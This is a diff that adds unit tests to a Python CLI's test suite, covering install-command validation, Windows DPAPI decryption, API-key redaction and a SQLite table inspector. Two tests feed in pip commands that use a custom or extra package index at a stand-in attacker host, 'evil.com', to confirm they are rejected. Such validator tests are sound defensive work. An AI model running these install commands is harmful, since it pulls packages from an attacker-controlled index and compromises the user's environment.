@@ -2,10 +2,12 @@ from __future__ import annotations
 
 import ctypes
 import os
+import base64
 import hashlib
 import json
 import shutil
 import signal
+import sqlite3
 import subprocess
 import sys
 import tempfile
@@ -14397,6 +14399,63 @@ class SparkCliTests(unittest.TestCase):
                 check=True,
             )
             self.assertEqual(Path(result.stdout.strip()), Path(tmp_dir))
+
+    def test_install_command_argv_rejects_custom_pip_index_url(self) -> None:
+        with self.assertRaises(SystemExit) as ctx:
+            install_command_argv("pip install --index-url https://evil.com/simple pkg")
+        self.assertIn("custom package index URLs", str(ctx.exception))
+
+    def test_install_command_argv_rejects_extra_index_url(self) -> None:
+        with self.assertRaises(SystemExit) as ctx:
+            install_command_argv("uv pip install --extra-index-url https://evil.com/simple pkg")
+        self.assertIn("custom package index URLs", str(ctx.exception))
+
+    def test_install_command_argv_allows_default_pip_install(self) -> None:
+        argv = install_command_argv("pip install requests")
+        self.assertEqual(argv[:3], [str(Path(sys.executable)), "-m", "pip"])
+        self.assertIn("requests", argv)
+
+    def test_dpapi_unprotect_raises_on_cross_platform_dpapi_blob(self) -> None:
+        from spark_cli.cli import dpapi_unprotect
+        dpapi_blob = DPAPI_SECRET_PREFIX + base64.b64encode(b"\x00" * 8).decode("ascii")
+        if os.name == "nt":
+            self.skipTest("Windows DPAPI test")
+        with self.assertRaises(OSError) as ctx:
+            dpapi_unprotect(dpapi_blob)
+        self.assertIn("non-Windows", str(ctx.exception))
+
+    def test_dpapi_unprotect_passes_through_non_dpapi_values(self) -> None:
+        from spark_cli.cli import dpapi_unprotect
+        self.assertEqual(dpapi_unprotect("plain-secret"), "plain-secret")
+
+    def test_safe_short_string_truncates_before_redaction(self) -> None:
+        from spark_cli.system_map import safe_short_string
+        long_val = "x" * 250
+        result = safe_short_string(long_val, limit=240)
+        self.assertLessEqual(len(result), 243)  # 240 - 3 + "..."
+        self.assertTrue(result.endswith("..."))
+
+    def test_safe_short_string_redacts_api_key_in_truncated_value(self) -> None:
+        from spark_cli.system_map import safe_short_string
+        val = "api_key=sk-1234567890abcdef"
+        result = safe_short_string(val, limit=240)
+        self.assertIn("[redacted]", result)
+        self.assertNotIn("sk-1234567890abcdef", result)
+
+    def test_inspect_memory_state_db_sanitizes_table_names(self) -> None:
+        from spark_cli.system_map import inspect_builder_memory_tables
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            db_path = Path(tmp_dir) / "state.db"
+            conn = sqlite3.connect(str(db_path))
+            # Create a normal memory table and one with special chars
+            conn.execute('CREATE TABLE memory_events (id INTEGER)')
+            conn.execute('INSERT INTO memory_events VALUES (1)')
+            conn.commit()
+            conn.close()
+            result = inspect_builder_memory_tables(Path(tmp_dir))
+            # Valid table should be included without error
+            self.assertNotIn("error", result)
+            self.assertIn("tables", result)
 
 
 if __name__ == "__main__":
